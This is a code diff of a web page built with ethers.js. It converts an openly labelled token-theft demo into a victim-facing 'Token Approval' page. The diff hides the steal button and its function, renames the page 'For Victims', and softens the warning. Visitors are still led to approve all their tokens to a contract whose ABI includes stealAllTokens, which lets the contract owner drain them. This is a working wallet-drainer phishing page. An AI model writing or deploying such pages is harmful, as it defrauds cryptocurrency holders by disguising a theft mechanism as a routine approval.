@@ -1,18 +1,17 @@
-lp<!DOCTYPE html>
+a<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Approval and Theft</title>
+    <title>Token Approval (For Victims)</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
-    <h2>Token Approval and Theft</h2>
-    <p>WARNING: This is a demonstration of token approval and potential theft. Use at your own risk!</p>
+    <h2>Token Approval</h2>
+    <p>WARNING: By approving tokens, you are giving permission for the contract to spend your tokens. Only proceed if you understand the risks!</p>
 
     <button id="connectWalletButton">Connect Wallet</button>
     <button id="approveTokensButton" disabled>Approve Tokens</button>
-    <button id="stealTokensButton" disabled>Attempt to Steal Tokens</button>
 
     <div id="status"></div>
 
@@ -35,6 +34,18 @@ lp<!DOCTYPE html>
                 "name": "stealAllTokens",
                 "outputs": [],
                 "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
                 "type": "function"
             }
         ];
@@ -72,33 +83,15 @@ lp<!DOCTYPE html>
 
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             try {
-                for (let token of knownTokens) {
-                    const tx = await contract.approveAllTokens(token);
-                    await tx.wait(); // Menunggu konfirmasi transaksi
-                    console.log(`Approved token: ${token}`);
-                }
-                updateStatus("Tokens approved! You have now authorized the contract to access your tokens.");
+                const promises = knownTokens.map(token => 
+                    contract.approveAllTokens(token).then(tx => tx.wait())
+                );
+                await Promise.all(promises);
+                console.log(`All tokens approved`);
+                updateStatus("Tokens approved! You have now authorized the contract to access your tokens. Be cautious!");
             } catch (error) {
                 console.error("Approval failed:", error);
                 updateStatus("Approval failed. Check console for details.");
-            }
-        }
-
-        async function stealTokens() {
-            if (!signer) {
-                updateStatus("Connect your wallet first!");
-                return;
-            }
-
-            const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            try {
-                const userAddress = await signer.getAddress();
-                const tx = await contract.stealAllTokens(userAddress, knownTokens);
-                await tx.wait(); // Menunggu konfirmasi transaksi
-                updateStatus("Attempted to steal tokens. Note: Only the contract owner can actually execute this.");
-            } catch (error) {
-                console.error("Stealing tokens failed:", error);
-                updateStatus("Stealing tokens failed. You might not be the contract owner or another issue occurred.");
             }
         }
 
@@ -109,7 +102,6 @@ lp<!DOCTYPE html>
         // Event listeners for buttons
         document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
         document.getElementById('approveTokensButton').addEventListener('click', approveTokens);
-        document.getElementById('stealTokensButton').addEventListener('click', stealTokens);
     </script>
 </body>
 </html>
